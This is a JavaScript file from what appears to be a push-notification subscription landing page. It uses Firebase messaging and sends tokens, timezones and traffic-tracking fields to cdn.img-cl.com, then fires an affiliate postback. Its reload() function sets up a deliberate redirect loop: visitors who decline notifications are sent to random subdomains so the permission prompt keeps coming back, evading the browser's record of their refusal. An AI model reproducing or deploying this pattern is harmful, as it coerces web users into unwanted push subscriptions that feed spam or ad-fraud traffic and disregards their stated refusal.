document.getElementById('click1').addEventListener('click', function (e) {
    e.preventDefault();
    reload();
});
document.getElementById('click2').addEventListener('click', function (e) {
    e.preventDefault();
    reload();
});
if (
    'Notification' in window &&
    'serviceWorker' in navigator &&
    'indexedDB' in window &&
    'fetch' in window
) {
    //navigator.serviceWorker.register('/firebase-messaging-sw.js');
    firebase.initializeApp({
        messagingSenderId: '341473661157'
    });
    var messaging = firebase.messaging();
    var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
    document.addEventListener('DOMContentLoaded', function() {
        subscribe();
    });

} else{
    out();
}
function subscribe() {
    messaging.requestPermission()
        .then(function () {
            document.getElementById('loading').style.display = "flex";
            messaging.getToken()
                .then(function (currentToken) {
                    document.getElementById('loading').style.display = "flex";
                    getData(function (data) {
                        if (currentToken) {
                            if(currentToken.localeCompare(data.token) != 0 && data.id == null) {
                                sendToken(currentToken);
                            }
                            else if (data.id != null && currentToken.localeCompare(data.token) != 0) {
                                updateToken(currentToken, data.id);
                            }
                        }
                        else {
                            out();
                        }
                    });
                })
                .catch(function (err) {
                    out();
                });
        })
        .catch(function (err) {
            // Prevent auto cancel "allow notification" without user interaction.
            if(err.code == "messaging/permission-default") {
                document.getElementById('loading').style.display = "none";
                document.getElementById('sure').style.display = "flex";
            }
            else {
                reload();
            }
        });
}

// Redirect loop if user declined subscribed
function reload() {
    let all_rs = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
    const ranDom = all_rs[Math.round(Math.random() * (0 - 33)) + 33] + all_rs[Math.round(Math.random() * (0 - 33)) + 33] + all_rs[Math.round(Math.random() * (0 - 33)) + 33] + all_rs[Math.round(Math.random() * (0 - 33)) + 33] + all_rs[Math.round(Math.random() * (0 - 33)) + 33];
    location.href = window.location.protocol + "//" + ranDom + "."+domain+location.pathname+location.search;
}

// Redirect after subscription
function out() {
    if(outlink) {
        link = outlink;
        if(link.indexOf('?')+1) {
            link += "&"+location.search.substring(1);
        }
        else {
            link += "?"+location.search.substring(1);
        }
        window.location.href = link;
    }
}
function updateToken(currentToken, id) {
    let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if(tz == null || tz == undefined) {
        tz = "UTC";
    }
    fetch("https://cdn.img-cl.com/subscriber/update", { // Please use stub for UI tests
        method: "POST",
        headers: {
            "Content-type": "application/json; charset=UTF-8",
        },
        body: JSON.stringify({
            id: id,
            token: currentToken,
            timezone: tz,
        })
    })
        .then((response) => {
            return response.json();
        })
        .then((data) => {
            if(data.status) {
                setData(data.entity.id, currentToken);
                out();
            }
            else {
                out();
            }
        })
        .catch(function (err){
            out();
        });
}
function sendToken(currentToken) {
    let tz = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get subscriber timezone
    const params = new URLSearchParams(window.location.search);
    let tag = null;
    let user = null;
    let country = null;
    let clickid = null;
    let category = null;
    let source = null;
    // Get Traffic Source id from GET params (filed is required)
    if(params.get('source')) {
        source = {
            id: parseInt(params.get('source'))
        };
    }
    // Get Category id from GET params (filed is required)
    if(params.get('category')) {
        category = {
            id: parseInt(params.get('category'))
        };
    }
    // Get administrator id from GET params (filed is required). Can be hardcoded.
    if(params.get('user')) {
        user = {
            id: parseInt(params.get('user'))
        };
    }
    // Get tag id from GET params
    if(params.get('tag')) {
        tag = {
            id: parseInt(params.get('tag'))
        };
    }
    // Get country code (2 letter ISO) from GET params (filed is required)
    if(params.get('country_code')) {
        country = {
            name: params.get('country_code')
        };
    }
    // Get clickid from GET params for postback
    if(params.get('clickid')) {
        clickid = params.get('clickid');
    }
    if(tz == null || tz == undefined) {
        tz = "UTC";
    }
    // Send data to server
    fetch("https://cdn.img-cl.com/subscriber/add", { // Please use stub for UI tests
        method: "POST",
        headers: {
            "Content-type": "application/json; charset=UTF-8",
        },
        body: JSON.stringify({
            token: currentToken,
            timezone: tz,
            tag: tag,
            administrator: user,
            category: category,
            traffic_source: source,
            country: country,
        })
    })
        .then((response) => {
            return response.json();
        })
        .then((data) => {
            if(data.status) {
                // Save data to indexedDB
                setData(data.entity.id, currentToken);
                //Do postback for tracking subscription
                if(clickid) {
                    fetch(postbacklink.replace("{clickid}", clickid)).then(function () {
                        out();
                    })
                        .catch(function () {
                            out();
                        })
                }
                else {
                    out();
                }
            }
            else {
                out();
            }
        })
        .catch(function (err){
            out();
        });
}
function connectDB(f){
    let request = indexedDB.open("subscriber", 1);
    request.onerror = out;
    request.onsuccess = function(){
        f(request.result);
    };
    request.onupgradeneeded = function(e){
        e.currentTarget.result.createObjectStore("data", { keyPath: "data" });
    }
}
// Get userid and current subscriber token from indexedDB
function getData(f){
    connectDB(function(db){
        let request = db.transaction(["data"], "readonly").objectStore("data").get("data");
        request.onerror = function () {
            out();
        };
        request.onsuccess = function(){
            f(request.result ? {id:request.result.id,token:request.result.token }: {id:null,token:null });
        }
    });
}
// Store userid and current subscriber token from indexedDB
function setData(id, token){
    connectDB(function(db){
        let request = db.transaction(["data"], "readwrite").objectStore("data").put({data: 'data', id: id, token: token});
        request.onerror = out;
        request.onsuccess = function(){
            return request.result;
        }
    });
}